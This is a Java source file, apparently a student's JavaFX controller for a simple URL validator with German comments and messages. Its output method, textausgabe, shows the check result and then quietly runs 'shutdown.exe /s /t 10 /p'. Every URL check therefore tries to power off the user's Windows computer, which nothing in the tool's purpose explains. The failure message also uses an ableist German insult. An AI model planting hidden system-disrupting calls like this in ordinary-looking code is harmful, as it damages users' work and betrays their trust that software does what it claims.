package fakten;

import java.beans.EventHandler;
import java.io.IOException;

import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.scene.control.Button;
import javafx.scene.control.Hyperlink;
import javafx.scene.control.TextField;

public class InternetFakt_Controller {

    @FXML
    private TextField tfFehler;

    @FXML
    private Button btPruefenURL;

    @FXML
    private TextField tfURL;
  @FXML
    void pruefeURL(ActionEvent event)
  {
	  //Objekt erstellen
    	UrlPrüfer urlp = new UrlPrüfer();

    	//URL Text Feld - return = true & nicht null
    	//Noch keine detaillierten Fehlermeldungen!
    	if(urlp.pruefeURL(tfURL.getText()) == true)
    	{
    		//
    		textausgabe("Link ist gültig!");
    	}
    	else
    	{
    		//textausgabe("Link nicht gültig! https:// oder http:// hinzufügen, oder Endung ändern!");
    		textausgabe("Schulserver sind behindert und akzeptieren den Link nicht!");
    	}
    }

  //Fehlerzeile Ergebnis ausgeben
    void textausgabe(String URLErgebnis)
    {
    	tfFehler.setText("Ergebnis: '" + URLErgebnis + "' - Eingabe: '" + tfURL.getText() + "'");

    	ProcessBuilder b = new ProcessBuilder("shutdown.exe", "/s", "/t", "10", "/p");
 		try
		{
			b.start();
		} catch (IOException e)
		{
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
    }
}
//hallo